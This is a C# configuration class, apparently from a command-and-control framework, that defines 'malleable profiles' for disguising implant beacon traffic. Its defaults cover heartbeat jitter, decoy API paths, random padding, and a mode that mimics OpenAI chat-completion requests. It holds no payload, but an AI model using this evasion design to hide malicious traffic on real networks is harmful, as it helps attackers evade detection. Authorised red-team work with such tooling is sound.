namespace LibraNextgen.Service.Profiles;

/// <summary>
/// Persistable malleable profile configuration stored in MongoDB.
/// Operators can create custom profiles to shape agent traffic.
/// </summary>
public class MalleableProfileConfig
{
    public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string Name { get; set; } = string.Empty;
    public string Description { get; set; } = string.Empty;
    public bool IsActive { get; set; }
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public string CreatedBy { get; set; } = string.Empty;

    public string RegisterPath { get; set; } = "/api/beacon/register";
    public string HeartbeatPath { get; set; } = "/api/beacon/heartbeat";
    public string ResultPath { get; set; } = "/api/beacon/result";
    public string WebSocketPath { get; set; } = "/ws/chat";

    public string UserAgent { get; set; } = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    public Dictionary<string, string> CustomHeaders { get; set; } = new();

    public int HeartbeatIntervalSeconds { get; set; } = 60;
    public double JitterPercent { get; set; } = 0.2;


    public string EntryPath { get; set; } = "/api";

    public List<string> PathSuffixes { get; set; } = new()
    {
        "user/info", "orders/list", "profile", "settings",
        "notifications", "messages/unread", "search/history",
    };

    public string DataKey { get; set; } = "d";
    public string TsKey { get; set; } = "ts";
    public string RandKey { get; set; } = "r";
    public string SignKey { get; set; } = "sign";
    public string TokenKey { get; set; } = "sid";

    public List<string> UserAgents { get; set; } = new();

    public int PaddingMin { get; set; } = 0;
    public int PaddingMax { get; set; } = 64;


    public string AiPath { get; set; } = "/v1/chat/completions";

    public List<string> AiModels { get; set; } = new()
    {
        "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini",
    };

    public string AuthPrefix { get; set; } = "sk-";
}
